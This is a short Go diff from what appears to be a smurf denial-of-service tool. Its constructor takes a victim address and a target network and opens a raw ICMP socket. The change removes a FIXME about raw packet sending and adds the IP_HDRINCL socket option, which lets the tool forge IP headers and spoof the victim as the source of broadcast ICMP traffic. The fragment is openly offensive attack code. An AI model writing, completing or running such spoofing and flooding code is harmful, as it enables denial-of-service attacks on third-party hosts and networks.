@@ -14,12 +14,11 @@ type smurf struct {
 }
 
 func newSmurf(victim, network net.IP) (*smurf, error) {
-	// FIXME: Need to use pcap to send raw IPv4 packets containing ICMP over Ethernet.
-	// The syscall library IPPROTO_ICMP slaps real IP header on data sent
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
 	if err != nil {
 		return nil, errors.Wrap(err, "could not get raw icmp socket")
 	}
+	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
 
 	var remote syscall.SockaddrInet4
 	copy(remote.Addr[:], network.To4())
